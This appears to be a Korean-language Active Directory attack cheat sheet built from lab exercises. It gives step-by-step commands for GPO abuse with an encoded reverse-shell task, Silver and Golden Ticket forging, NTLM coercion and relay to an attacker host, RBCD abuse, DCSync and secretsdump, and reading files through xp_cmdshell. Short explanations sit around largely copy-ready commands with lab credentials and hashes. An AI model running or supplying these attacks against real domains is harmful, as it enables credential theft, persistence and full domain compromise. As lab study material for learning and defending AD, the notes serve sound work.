</details>

---
<details>
  <summary><strong>krb5.conf(최신 AD 인증)</strong></summary>

- Kerberos 5 인증 시스템의 클라이언트 설정 파일
- 최신 AD는 NTLM을 비활성화하는 추세
- `winrm`을 사용하지 못할 경우에 `krb5.conf`를 사용해서 `SSH`를 포함한 다른 프로토콜로 접속 가능.

```bash
netexec smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file krb5.conf

sudo cp krb5.conf /etc/krbt.conf
```
```bash
impacket-getTGT <domain>/<user>:<pass>

# /etc/hosts에 FQDN이 우선적으로 등록
KRB5CCNAME=f.frizzle.ccache ssh -K <user>@<domain>
```

</details>

---
<details>
  <summary><strong>Group Policy Creator Owners</strong></summary>

- https://medium.com/@raphaeltzy13/group-policy-object-gpo-abuse-windows-active-directory-privilege-escalation-51d8519a13d7
```powershell
New-GPO -name "0xdf"

# DC의 Distinguished Name
New-GPLink -Name "0xdf" -target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB"

.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"

.\SharpGPOAbuse.exe --addcomputertask --GPOName "ippsec" --Author "ippsec" --TaskName "revshell" --Command "powershell.exe" --Arguments "powershell -enc <base64>"

gpupdate /force
```
  
</details>

---
<details>
  <summary><strong>Silver Ticket</strong></summary>

## Silver Ticket이 성립하는 3가지 전제

### 1. KDC가 재검증하지 않음
- Kerberos의 설계 철학 자체가 **분산 인증**
- 매번 KDC에 검증 요청하면 병목이 발생하므로 서비스가 자체 검증
- 서비스가 오프라인이어도 인증이 작동하도록 설계된 부분도 원인

### 2. IP 주소 검증 없음
- Kerberos 티켓 내부에 IP 주소는 선택적 필드이며 보통 포함되지 않음
- **도메인명과 SPN만 맞으면** 어디서든 티켓 제출 가능

```
TGS 주요 내용:
- 사용자명
- 도메인명
- 서비스 SPN (Service Principal Name)
- 권한 정보 (PAC)
- 유효기간
※ IP 주소는 미포함
```

### 3. PAC 내용을 무조건 신뢰
- PAC(Privilege Attribute Certificate)에는 사용자 권한 정보가 담겨 있음
- 서비스는 PAC 내용을 별도 검증 없이 신뢰하므로 **권한 정보도 위조 가능**


## 티켓 발행
- `GetUserSPNs`를 사용하여 `SPN`이 등록되어 있는지 확인 필요.
- `NTLM(password to ntlm)`과 `SID` 필요.
- `groups`옵션을 사용하여 해당 그룹의 권한을 획득할 수 있음.
- 특별히 특정 유저와 그룹을 정해주는게 아니라면 옵션에서 제외해도 작동.

```bash
# password to hash
echo -n <password> | iconv -t utf-16le | openssl md4 -provider legacy
python3 -c 'import hashlib; print(hashlib.new("md4", "purPLE9795!@".encode("utf-16le")).hexdigest())'

# SPN을 필수로 입력해 줘야하지만 완전히 일치하지 않아도 됨.
ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb -groups 1105 Administrator

ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb Administrator


KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k <FQDN>
```

## PAC 권한 상승
- https://vuln.dev/silver-ticket-mssql-clr/

### PAC(Privilege Attribute Certificate)이란?
- PAC은 Kerberos 티켓 안에 포함된 **사용자의 그룹 멤버십 및 권한 정보**입니다.

### Silver Ticket에서 PAC이 중요한 이유
- Silver Ticket은 **서비스 계정의 NTLM 해시로 TGS(서비스 티켓)를 위조**하는 공격입니다.
- 서비스는 티켓을 받으면 KDC에 다시 물어보지 않고, **자신이 복호화할 수 있으면 유효한 티켓으로 간주**합니다. 이 구조적 허점이 PAC 조작을 가능하게 합니다.
```
Silver Ticket 위조
↓
PAC에 임의 그룹(admin 등) 삽입
↓
서비스 계정 해시로 암호화
↓
서비스(MSSQL 등)가 자신의 해시로 복호화
↓
KDC에 검증 요청 없이 PAC 내용을 그대로 신뢰
↓
공격자가 넣은 그룹 멤버로 인식
```

### 주요 그룹 RID 목록

| RID | 그룹 | 권한 |
|---|---|---|
| 512 | Domain Admins | 도메인 최고 권한 |
| 513 | Domain Users | 기본 도메인 멤버 |
| 518 | Schema Admins | 스키마 관리 |
| 519 | Enterprise Admins | 포레스트 전체 권한 |
| 1105~ | 커스텀 그룹 | 도메인마다 다름 (enum_logins로 확인) |

### 권한 상승
- `Domains Admins` 그룹으로 속해 있을 경우
- `OPENROWSET(BULK)`는 서비스 계정으로 읽게 되어서 사용자가 접근하지 못하는 파일에 접근 가능.
```bash
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -user-id 1103 -groups '512,1105' doesntmatter

KRB5CCNAME=doesntmatter.ccache mssqlclient.py -no-pass -k DC01.signed.htb
```
```mssql
# 활성화 안되어 있으면 활성화
xp_cmdshell "type C:\Users\Administrator\Desktop\root.txt"

SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS Contents;
```

</details>

---
<details>
  <summary><strong>NTLM Reflection</strong></summary>

- https://www.rbtsec.com/blog/ntlm-reflection-abusing-ntlm-for-privilege-escalation-cve-2025-33073/
- `SMB` 인증이 되지 않을시 다른 포트를 시도해보기.
```
# 강제 인증 유도 확인
nxc smb 192.168.115.185 -u scarter -p Passw0rd -M coerce_plus

# 로컬로 오는 인증을 릴레이
impacket-ntlmrelayx -t wkstn-3.shield.local -smb2support
impacket-ntlmrelayx -t winrms://wkstn-3.shield.local -smb2support

# localhost DNS 생성
python3 dnstool.py -u 'shield.local\scarter' -p 'Passw0rd' dc4.shield.local -a add -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -d <local IP> -dns-ip <Remote DNS IP> --tcp

# 인증 시도
nxc smb 192.168.115.185 -u scarter -p Passw0rd -M coerce_plus -o METHOD=PetitPotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

</details>

---
<details>
 <summary><strong>IIS APPPOOL\DefaultAppPool</strong></summary>

- Microsoft Virtual Account의 특징.
- 로컬에서는 가상 계정으로, 네트워크에서는 머신 계정으로 바뀜.
- 도메인에 속한 것이 확인되어 티켓 발행 가능.
<img width="1202" height="85" alt="image" src="https://github.com/user-attachments/assets/4b1b4c79-5e65-4f0f-84f9-eb779dbce67d" />
<img width="1202" height="180" alt="image" src="https://github.com/user-attachments/assets/85ddee70-f086-41d8-a67d-2fe29b1fd8d5" />

```powershell
.\rubeus.exe tgtdeleg /nowrap

impacket-ticketConverter ticket.kirbi ticket.ccache
```


</details>

---
<details>
  <summary><strong>STATUS_PASSWORD_MUST_CHANGE</strong></summary>

- https://www.netexec.wiki/smb-protocol/change-user-password
```bash
nxc smb <ip> -u user -p pass -M change-password -o NEWPASS=NewPassword
```
  
</details>

---
<details>
  <summary><strong>readGMSAPassword</strong></summary>

```bash
netexec ldap DC.sendai.vl -u Thomas.Powell -p 0xdf0xdf.... --gmsa
```
  
</details>

---
<details>
  <summary><strong>AddAllowedToAct</strong></summary>

## Machine Account Quota (MAQ) 확인

```bash
netexec ldap dc.phantom.vl -u wsilva -p 0xdf0xdf -M maq
```

| MAQ 값 | 의미 |
|--------|------|
| `10` (기본값) | 일반 유저도 컴퓨터 객체 10개까지 추가 가능 |
| `0` | 컴퓨터 객체 추가 불가 → 일반 RBCD 불가 |

> MAQ=0이어도 RBCD 자체가 막히는 것은 아님.  
> 새 컴퓨터 객체 **생성**만 불가한 것이므로 우회 방법 필요.

## 일반적인 RBCD 공격 흐름 (MAQ > 0)

```
1. AddAllowedToAct 권한 확인 (BloodHound)
        ↓
2. 새 컴퓨터 객체 생성 (SPN 자동 부여)
        ↓
3. 타겟 서버의 AllowedToAct에 새 컴퓨터 등록
        ↓
4. S4U2Self + S4U2Proxy로 Administrator 티켓 발급
        ↓
5. 타겟 서버 접근
```

## MAQ=0 환경 우회: Forshaw 기법

### 핵심 아이디어

```
유저의 NTLM 해시 == TGT 세션 키
→ 이 조건이 맞으면 SPN 없이도 S4U2Self가 작동
```

### 상세 공격 흐름

```
1. TGT 획득 → wsilva.ccache 생성
        ↓
2. describeTicket으로 TGT 세션 키 추출
        ↓
3. changepasswd로 패스워드 변경
   (새 NTLM 해시 = TGT 세션 키)
        ↓
4. AllowedToAct에 wsilva 자신을 등록
        ↓
5. getST.py -u2u 로 Administrator 서비스 티켓 발급
        ↓
6. Administrator로 타겟 서버 접근
```

```bash
rbcd.py -delegate-to 'DC$' -delegate-from wsilva -action write phantom/wsilva:0xdf0xdf -dc-ip 10.129.234.63

getTGT.py phantom.vl/wsilva:0xdf0xdf

describeTicket.py wsilva.ccache

changepasswd.py -newhashes :d777c9fe8cdbfbadca48b671967f54e7 phantom/wsilva:0xdf0xdf@dc.phantom.vl

KRB5CCNAME=wsilva.ccache getST.py -u2u -impersonate Administrator -spn cifs/DC.phantom.vl phantom.vl/wsilva -k -no-pass
```
  
</details>

---
<details>
  <summary><strong>NTLM Relay</strong></summary>

# NTLM Relay 공격 정리
## 1. 공격 개요

NTLM Relay 공격은 피해자의 NTLM 인증을 **중간에서 가로채 다른 서버에 그대로 전달**하는 공격입니다.
해시를 크랙할 필요 없이 인증 자체를 재사용하는 것이 핵심입니다.

```
피해자 → (NTLM 인증 캡처) → 공격자 → (인증 그대로 전달) → 대상 서버
```

---

## 2. SMB Signing

### 개념

SMB 패킷에 **디지털 서명**을 적용해 패킷의 무결성을 보장하는 보안 기능입니다.

```
Signing 활성화:   클라이언트 → [서명된 패킷] → 서버  ✅ 변조 감지 가능
Signing 비활성화: 클라이언트 → [서명 없는 패킷] → 서버  ❌ 중간자 공격 가능
```

### 릴레이 공격과의 관계

공격자는 클라이언트의 서명 키를 알 수 없기 때문에 **Signing이 활성화된 서버에는 릴레이가 불가능**합니다.
따라서 릴레이 공격은 반드시 **SMB Signing이 비활성화된 호스트**를 대상으로 해야 합니다.

> Windows Server 2025부터 SMB Signing이 기본 활성화되어 이 공격 벡터가 크게 줄었습니다.

---

## 3. 단계별 공격 흐름

### 3-1단계: 릴레이 대상 수집 (gen-relay-list)

```bash
nxc smb 192.168.121.172-174 -u 'Eric.Wallows' -p 'EricLikesRunning800' --gen-relay-list smb_targets.txt
```

- 작동하지 않는 경우 발생.
- 수동으로 각 ip에 접속해서 리스트 생성.

---

### 3-2단계: NTLM 인증 유도

#### 방법 1: Slinky 모듈 (nxc)

```bash
nxc smb 192.168.121.173 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M slinky -o SERVER=192.168.45.159 NAME=README
```

| 옵션 | 설명 |
|---|---|
| `-M slinky` | slinky 모듈 사용 |
| `SERVER=192.168.45.159` | 공격자 서버 IP |
| `NAME=README` | 생성할 .lnk 파일 이름 |

**동작 원리:**
1. 대상 SMB 공유에 `README.lnk` 파일 생성
2. 피해자가 탐색기로 해당 폴더를 열면 자동으로 트리거
3. 피해자의 NTLM 인증이 공격자 서버로 전송

> `.lnk` 파일은 클릭하지 않아도 탐색기에서 폴더를 열기만 해도 트리거됩니다.

#### 방법 2: NTLMTheft

다양한 파일 포맷을 생성하여 수동으로 업로드하는 방식입니다.

| 파일 포맷 | 트리거 조건 |
|---|---|
| `.lnk` | 탐색기로 폴더 열기 |
| `.url` | 탐색기로 폴더 열기 |
| `.scf` | 탐색기로 폴더 열기 |
| `desktop.ini` | 폴더 열기 (숨김 파일, 자동 실행) |
| `.docx`, `.xlsx` | Office 파일 열기 |

---

### 3-3단계: NTLM 릴레이 실행

#### Responder 설정

릴레이 공격 시 SMB, HTTP를 반드시 **OFF**로 설정해야 합니다.

```bash
# /etc/responder/Responder.conf
SMB = Off
HTTP = Off
```

- Responder 역할: LLMNR/NBT-NS 포이즈닝으로 피해자를 공격자 IP로 **유도**
- ntlmrelayx 역할: 실제 NTLM 인증 **캡처 및 릴레이**
- `lnk`파일을 업로드 할 수 있는 상황이라면 Responder를 사용하지 않아도 유도 가능.

#### ntlmrelayx 실행

```bash
# 기본 실행 (SAM 자동 덤프 시도)
ntlmrelayx.py -tf smb_targets.txt -smb2support

# 대화형 세션 획득
ntlmrelayx.py -tf smb_targets.txt -smb2support -i

# 명령 실행
ntlmrelayx.py -tf smb_targets.txt -smb2support -c "whoami"

# LSA 명시적 덤프
ntlmrelayx.py -tf smb_targets.txt -smb2support --lsa
```
---

## 5. LSA/SAM 덤핑

### 권한 조건

```
릴레이 성공 + 관리자 권한 O  →  LSA/SAM 덤핑 성공 ✅
릴레이 성공 + 관리자 권한 X  →  덤핑 실패, 접근 거부 ❌
```
  
</details>

---
<details>
  <summary><strong>SameForestTrust</strong></summary>

## KRBTGT가 중요한 이유

### Kerberos 인증 구조

```
사용자 로그인 요청
      ↓
[KDC - Key Distribution Center]  ← krbtgt가 여기서 동작
      ↓
TGT 발급 (krbtgt 해시로 서명)
      ↓
TGT로 서비스 티켓 요청
      ↓
도메인 리소스 접근
```

- 도메인 내 **모든 Kerberos 티켓은 krbtgt 해시로 서명**
- DC는 티켓 검증 시 krbtgt 해시로 복호화하여 신뢰 여부 판단
- **krbtgt = 티켓의 진위를 보증하는 도장**

### Golden Ticket이란?

krbtgt 해시를 알면 **TGT를 직접 위조** 가능

```
DC 입장에서:
정상 TGT  →  krbtgt 해시로 서명됨  →  신뢰 ✅
위조 TGT  →  krbtgt 해시로 서명됨  →  신뢰 ✅  ← 구분 불가!
```

| 항목 | 내용 |
|------|------|
| 위조 대상 | 존재하지 않는 계정도 가능 |
| 권한 설정 | Domain Admin 등 임의 설정 |
| 유효 기간 | **최대 10년으로 설정 가능** |
| DC 온라인 여부 | **불필요** (오프라인 생성 가능) |

---

## Administrator 해시 vs krbtgt 해시 비교

| 항목 | Administrator NT Hash | krbtgt Golden Ticket |
|------|----------------------|---------------------|
| 도메인 관리자 권한 | ✅ | ✅ |
| sub 도메인 장악 | ✅ | ✅ |
| **비밀번호 변경 시** | **즉시 무효화** ❌ | **2회 변경 전까지 유효** ✅ |
| DC 온라인 필요 | 필요 | 불필요 |
| 티켓 유효기간 | Kerberos 정책 따름 | 최대 10년 |
| 탐지 난이도 | 상대적으로 쉬움 | 어려움 |
| 루트 도메인 확장 | ❌ | ✅ (SID 추가 시) |

> **Administrator 해시** = "지금 당장 들어가는 열쇠"
> **krbtgt 해시** = "열쇠 공장을 통째로 가진 것"

### 실제 공격자 관점에서의 활용

```
Administrator 해시  →  즉각적인 접근에 사용 (sub 도메인 장악)
krbtgt 해시        →  장기적인 백도어 + 루트 도메인 확장
```

---

## SameForestTrust를 통한 루트 도메인 확장

### SameForestTrust란?

```
SUB.POSEIDON.YZX  →  POSEIDON.YZX
     하위 도메인         루트 도메인
     (같은 포레스트 내)
```

### Trust 종류별 위험도

| Trust 종류 | SID 필터링 | 위험도 |
|-----------|-----------|--------|
| **SameForestTrust** | **❌ 없음** | **최고** |
| ExternalTrust | ✅ 있음 | 중간 |
| ForestTrust | ✅ 있음 | 중간 |

같은 포레스트 내부는 기본적으로 완전히 신뢰하기 때문에 **SID 필터링이 작동하지 않음**

### 루트 도메인 침투 흐름

```
DCSync로 krbtgt 해시 탈취
        ↓
Golden Ticket 생성 시 Enterprise Admins SID 추가
        ↓
SameForestTrust 경유
        ↓
poseidon.yzx 루트 도메인 장악 ✅
        ↓
포레스트 전체 완전 장악
```

---

## 리눅스(Impacket)로 Golden Ticket 생성

### Step 1. 도메인 SID 확인

```bash
lookupsid.py sub.poseidon.yzx/Administrator@DC02.sub.poseidon.yzx \
  -hashes :3bcdd818f7ec942ac91aa30d8db71927
```

### Step 2. Golden Ticket 생성 (ticketer.py)

```bash
python3 ticketer.py \
  -nthash 80f23a248d39b8cb93df3a4a2f4199a1 \
  -domain-sid [SUB 도메인 SID] \
  -domain sub.poseidon.yzx \
  -extra-sid [루트도메인 Enterprise Admins SID]-519 \
  Administrator
```

> `/extra-sid`에 Enterprise Admins SID를 포함하면 별도 명령어 없이 한 번에 생성 가능
> `krbtgt` hash 사용

### Step 3. 티켓 등록 및 사용

```bash
# 환경변수에 티켓 등록
export KRB5CCNAME=Administrator.ccache

# 루트 도메인 접근
psexec.py -k -no-pass poseidon.yzx/Administrator@DC.poseidon.yzx
secretsdump.py -k -no-pass poseidon.yzx/Administrator@DC.poseidon.yzx
wmiexec.py -k -no-pass poseidon.yzx/Administrator@DC.poseidon.yzx
```

---

## 전체 공격 흐름 요약

```
LISA 계정 GetChangesAll 권한 확인 (BloodHound)
        ↓
DCSync 공격으로 모든 해시 덤프
        ↓
┌─────────────────────────────────────┐
│  Administrator 해시 획득             │
│  → sub.poseidon.yzx 즉시 장악 ✅    │
│  → DC의 Administrator = 도메인 관리자│
└─────────────────────────────────────┘
        ↓
┌─────────────────────────────────────┐
│  krbtgt 해시 획득                    │
│  → Golden Ticket 생성               │
│  → 장기 지속성 확보 ✅               │
│  → SameForestTrust 경유             │
│  → poseidon.yzx 루트 도메인 장악 ✅  │
└─────────────────────────────────────┘
```

  
</details>

---
<details>
  <summary><strong>SeEnableDelegationPrivilege</strong></summary>

- 서명 강제가 아닐 경우 릴레잉 가능
```bash
netexec ldap dc1.delegate.vl -u A.Briggs -p P4ssw0rd1#123 -M maq

addcomputer.py -computer-name oxdf -computer-pass 0xdf0xdf. -dc-ip 10.129.56.255 delegate.vl/N.Thompson:'KALEB_2341'

python3 /opt/krbrelayx/dnstool.py -u 'delegate.vl\oxdf$' -p '0xdf0xdf.' --action add --record oxdf.delegate.vl --data 10.10.14.35 --type A -dns-ip 10.129.56.255 dc1.delegate.vl

python3 /opt/krbrelayx/addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/oxdf.delegate.vl' -t 'oxdf$' -dc-ip 10.129.56.255 dc1.delegate.vl

bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'oxdf$' -f TRUSTED_FOR_DELEGATION

echo -n <New Computer password> | iconv -t utf-16le | openssl md4 -provider legacy

python3 /opt/krbrelayx/krbrelayx.py -hashes :02cb8258df07966e32677128e5ff1d26
```
```bash
netexec smb dc1.delegate.vl -u 'oxdf$' -p 0xdf0xdf. -M coerce_plus

netexec smb dc1.delegate.vl -u 'oxdf$' -p 0xdf0xdf. -M coerce_plus -o LISTENER=oxdf.delegate.vl METHOD=PrinterBug
```

</details>

---
<details>
  <summary><strong>ZeroLogin</strong></summary>

- https://github.com/dirkjanm/CVE-2020-1472
  
</details>

---
<details>
  <summary><strong>WriteDacl</strong></summary>

- 대상 객체의 DACL을 수정할 수 있는 권한.
- Windows 보안 모델에서 DACL을 수정하라는 명령을 받았을 때, 시스템은 즉시 "이 요청자가 WriteDacl(또는 이를 포함하는 GenericAll 등) 권한을 가지고 있는가?"를 확인.
```powershell
. .\powerview.ps1
Add-DomainObjectAcl -Rights all -TargetIdentity GPOADM -PrincipalIdentity Amelia.Griffiths
$cred = ConvertTo-SecureString '0xdf0xdf.' -AsPlainText -Force
Set-DomainUserPassword GPOADM -AccountPassword $cred
```
  
</details>

---
<details>
  <summary><strong>DNS Admins Group</strong></summary>

- https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/
  
</details>
